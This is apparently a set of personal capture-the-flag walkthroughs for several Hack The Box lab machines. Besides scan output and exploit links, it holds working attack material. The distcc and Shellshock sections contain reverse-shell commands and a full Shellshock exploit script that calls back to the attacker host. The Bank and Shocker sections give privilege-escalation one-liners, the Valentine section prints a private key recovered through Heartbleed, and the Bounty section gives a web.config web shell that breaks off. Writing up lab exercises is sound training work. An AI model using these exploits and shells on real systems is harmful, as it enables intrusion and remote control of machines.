# Windows : Legacy  : 10.10.10.4 : Easy

Nmap Scan : 

```bash
Nmap scan report for 10.10.10.4
Host is up, received user-set (0.053s latency).
Scanned at 2020-12-30 19:17:39 GMT for 163s
Not shown: 65532 filtered ports
Reason: 65532 no-responses
PORT     STATE  SERVICE       REASON       VERSION
139/tcp  open   netbios-ssn   syn-ack      Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  syn-ack      Windows XP microsoft-ds
3389/tcp closed ms-wbt-server conn-refused
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d01h06m12s, deviation: 1h24m51s, median: 5d00h06m12s
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:71:0e (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   LEGACY<20>           Flags: <unique><active>
|   HTB<1e>              Flags: <group><active>
|   HTB<1d>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   00 50 56 b9 71 0e 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40600/tcp): CLEAN (Timeout)
|   Check 2 (port 14266/tcp): CLEAN (Timeout)
|   Check 3 (port 50902/udp): CLEAN (Timeout)
|   Check 4 (port 64786/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-01-04T23:25:44+02:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

```
Just ennumerating the service on 445 which is SMB and running at Windows XP we can see that its possibly vulnerable to exploits like : Eternal Blue (MS17-010) and ms08–067

There are metasploit modules for both of these exploits we can use those and get a shell as super user just by setting the rhosts to 10.10.10.4 and then LHOST to tun0 .

The modules we can use to get root shells are :

```
use exploit/windows/smb/ms17_010_psexec
use exploit/windows/smb/ms08_067_netapi
```



# Linux : Lame : 10.10.10.3 : Easy

Nmap Scan :

```bash
Nmap scan report for 10.10.10.3
Host is up (0.049s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.16
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h39m02s, deviation: 3h32m08s, median: 9m01s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-12-30T14:54:24-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.77 seconds
------------------------------------------------------------
Combined scan completed in 0:02:37.836006

```

Lets now search vulenrabilites first of all these version of services.

Vulenrabilites found on Port 21 : 
```bash 
vsftpd 2.3.4 - Backdoor Command Execution : https://raw.githubusercontent.com/ahervias77/vsftpd-2.3.4-exploit/master/vsftpd_234_exploit.py, https://www.exploit-db.com/exploits/17491
```

Vulnerabilites found on Port 3632 :

```bash
DistCC Daemon Command Execution  : https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec/
distccd v1 RCE (CVE-2004-2687) : https://gist.githubusercontent.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855/raw/48ab4eb0bd69cac67bc97fbe182e39e5ded99f9f/distccd_rce_CVE-2004-2687.py
```

Vulnerabilties found on 445 

```bash
BufferOVerflow : https://github.com/macha97/exploit-smb-3.0.20/blob/master/exploit-smb-3.0.20.py
RCE : https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/
```

Vulnerabilties on Port 22:
```bash
 SSH User Code Execution : https://www.rapid7.com/db/modules/exploit/multi/ssh/sshexec/
```

Exploit used in the end to gain root was this : https://github.com/amriunix/CVE-2007-2447
```bash
sudo apt install python python-pip
pip install --user pysmb
git clone https://github.com/amriunix/CVE-2007-2447.git
```
These commands would help us set up the exploit to work and then to get a revershe shell back lets use netcat to listen back for a reverse shell :

```bash
# syntax : python usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>
python usermap_script.py 10.10.10.3 445 10.10.14.16 4444
nc -nvlp 4444
```

Also we can get a shell through Daemon and get a shell as daemon and it seems to be vulnerbale to dritycow it didnt run when compiled on my machine but still its to be noted :

```bash
python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc -e /bin/bash 10.10.14.16 4444"
```

Dirty Cow exploit could be found here : https://www.exploit-db.com/raw/40839




# Linux : Valentine : 10.10.10.79 : Easy

Nmap Results :

```bash
Nmap scan report for 10.10.10.79
Host is up (0.049s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2020-12-31T16:25:03+00:00; +8m35s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 8m34s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.68 seconds

```

This seems to have a DNS host called valentine.htb letsd add it to our /et/chosts file but it seems like the name suggests its heartbleed 

Seems like the HTTP version is also vulnerable to this Buffer Overflow Attack :

```bash
PHP apache_request_headers Function Buffer Overflow : use exploit/windows/http/php_apache_request_headers_bof
```

And then we use the heartbleed exploit 

```
python heartbleed.py -n 1000 10.10.10.79
```

grepping for text we can find 

```
aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d
heartbleedbelievethehype
```

Gobuster Results :

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.79/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,zip,bak
[+] Timeout:        10s
===============================================================
2020/12/31 16:40:50 Starting gobuster
===============================================================
/index (Status: 200)
/index.php (Status: 200)
/dev (Status: 301)
/encode (Status: 200)
/encode.php (Status: 200)
/decode (Status: 200)
/decode.php (Status: 200)
/omg (Status: 200)

```


Going to these directories in the dev directory we found a file called hype.key which is a thing encoded in hex and decoding it gave us a hex key.

RSA Key, Hex form 
```
2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d
```

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

Dirty Cow vulnerability will help us get root on this scene as we noticed that the kernel version is old and is one of the kernel versions that are vulnerable to the Dirty Cow exploit which can be found here:
https://www.exploit-db.com/exploits/40839



# Linux : Shocker : 10.10.10.56 : Easy 

Nmap Results :
```
Nmap scan report for 10.10.10.56
Host is up (0.046s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Here the site is basically empty and doing a simple Gobuster we get an intresting folder called CGI-BIN which can possibly contain some .sh, .bin, .pl scripts which can then be used by us to exploit a vulnerability called shellshock. And luckily we find a user.sh file which we can use to exploit.

Here is an exploit we can use :

```python
#
#CVE-2014-6271 cgi-bin reverse shell
#

import httplib,urllib,sys

if (len(sys.argv)<4):
        print "Usage: %s <host> <vulnerable CGI> <attackhost/IP>" % sys.argv[0]
        print "Example: %s localhost /cgi-bin/test.cgi 10.0.0.1/8080" % sys.argv[0]
        exit(0)

conn = httplib.HTTPConnection(sys.argv[1])
reverse_shell="() { ignored;};/bin/bash -i >& /dev/tcp/%s 0>&1" % sys.argv[3]

headers = {"Content-type": "application/x-www-form-urlencoded",
        "test":reverse_shell }
conn.request("GET",sys.argv[2],headers=headers)
res = conn.getresponse()
print res.status, res.reason
data = res.read()
print data%   
```

Here we can see basically what its trying to do and running the command "() { ignored;};/bin/bash -i >& /dev/tcp/%s 0>&1" and now lets use this script like so :

```bash
python shellpoc.py 10.10.10.56 /cgi-bin/user.sh 10.10.14.24/4242
```

and then we can listen to use netcat to listen for our shell back. Now doing a simple sudo -l we can see we can run perl as root without any password so lets utilise that to our advantage and for this we can refer to a great resource called https://gtfobins.github.io/

and then using the command :
```
sudo /usr/bin/perl -e 'exec "/bin/sh";'
```

we will get our root shell and we can cat out the root flag.


# Linux : Sense : 10.10.10.60 : Easy

Nmap Results : 

```
Nmap scan report for 10.10.10.60
Host is up (0.052s latency).

PORT    STATE SERVICE    VERSION
80/tcp  open  http       lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time

```

Here we see 2 ports open at first i try to go to the http site and it just redirects us to 443 annd a pfsense login page so lets try some default credentails like admin:pfsense , admin:admin, root:root and we get nowhere so lets try dirbustinng a little. 

And we finnd two intresting things namely chagnelog.txt and system-users.txt

Contents of Changelog.txt
```
# Security Changelog 

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window
```

system-users.txt 
```
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```

In these case we look at defaults and try pfsense with the username and we get into the system annd in the dashboard we get Version 	2.1.3-RELEASE (amd64) which we can now use for our ennumeration purposes and 

Searching for exploits for this we come accross this exploit :

```
https://www.exploit-db.com/exploits/43560
```
and we also come across this article which intrestingly enough states 3 vulnerabilites :
https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/

Like stated in the changelog and in the changelog it was said only two of them are patched.


# Linux : Bank : 10.10.10.29 : Easy

Nmap Results :

```
Nmap scan report for 10.10.10.29
Host is up (0.058s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 29 13:12:05 2021 -- 1 IP address (1 host up) scanned in 16.37 seconds

```

Here we have a DNS port open so my first thought is to search for possible subdomains and ennumerate the dns port for which i used dig. 

```bash
dig @10.10.10.29 bank.htb -t AXFR +nocookie
```

and the results that we get are :

```
; <<>> DiG 9.16.4-Debian <<>> @10.10.10.29 bank.htb -t AXFR +nocookie
; (1 server found)
;; global options: +cmd
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
bank.htb.               604800  IN      NS      ns.bank.htb.
bank.htb.               604800  IN      A       10.10.10.29
ns.bank.htb.            604800  IN      A       10.10.10.29
www.bank.htb.           604800  IN      CNAME   bank.htb.
bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
;; Query time: 51 msec
;; SERVER: 10.10.10.29#53(10.10.10.29)
;; WHEN: Fri Jan 29 13:34:21 GMT 2021
;; XFR size: 6 records (messages 1, bytes 171)
```

Nothing really pops up leaving the bank.htb which i guessed due to how HTB names its domain. 

Now moving forward with this information we can go to the page and we are greeted with a login page but lets try brute forcing the directories and  we can use the command 

```
gobuster dir -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -x php,txt
```

and we get a directory called /balance-transfer/

![](./images/bank/transfers.png)

In the one where we find the size to be diffrent we can find credentials that will work for the email.

Logging into the system we find a dahsboard and a support page which seems to have a upload function and if we check the source code :

![](./images/bank/uploads.png)

So later we find out that we can execute remote php code just by renmaing our php file as htb so lets get a php reverse shell and we can put our IP and Port and rename the reverse shell as reverse.htb and then we can upload

![](./images/bank/rev.png)

and we can see our ticket in the Attachment page now clicking on Click Here we get our shell back which you have to listen for with nc.

We get a non TTY session so lets spawn a tty shell we can use this command :

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

doing sudo -l we are prompted for a password so i will try other things for now lets search for files with SUID/GUID permissions.

```
find / -perm -u=s -type f 2>/dev/null
```

and searching for it we get this as our results :
```
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
```
and then just chekcing the emergency file its an executable lets try running it and guess what we get a root shell.

# Windows : Bounty : 10.10.10.93 : Easy

Nmap Results :

```
Nmap scan report for 10.10.10.93
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


```

Going to the page we see that its just an image, so lets check source code and nnothing really  pops up lets try doing a simple dirbust and we can see that there is a file called  trasnfers.aspx and a directory called UploadedFiles.

Uploading files on the page transfers.aspx we see that it denies us if we use extensions like aspx, etc.

So lets try using a small lsit to check which extensions are allowed to uploaded and to do this we can use Burp's Intruder mode which will help us brute force some common extesnions and see what extension we can use to upload our reverse shell.

Trying a simple list of extensions we see that the .config extension can be used to do this you can use a simple .config file that executes cmd commands via ASPX code i found this shell for .config files which gives us sort of a web shell.

Code for the .CONFIG web shell

```c#
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
         <handlers accessPolicy="Read, Script, Write">
                  <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />                            
      </handlers>
            <security>                                                                                                                                                                                                                           
         <requestFiltering>                                                                                                                                                                                                                
            <fileExtensions>                                                                                                                                                                                                               
               <remove fileExtension=".config" />                                                                                                                                                                                          
            </fileExtensions>                                                                                                                                                                                                              
            <hiddenSegments>                                                                                                                                                                                                               
               <remove segment="web.config" />                                                                                                                                                                                             
            </hiddenSegments>                                                                                                                                                                                                              
         </requestFiltering>                                                                                                                                                                                                               
      </security>                                                                                                                                                                                                                          
   </system.webServer>                                                                                                                                                                                                                     
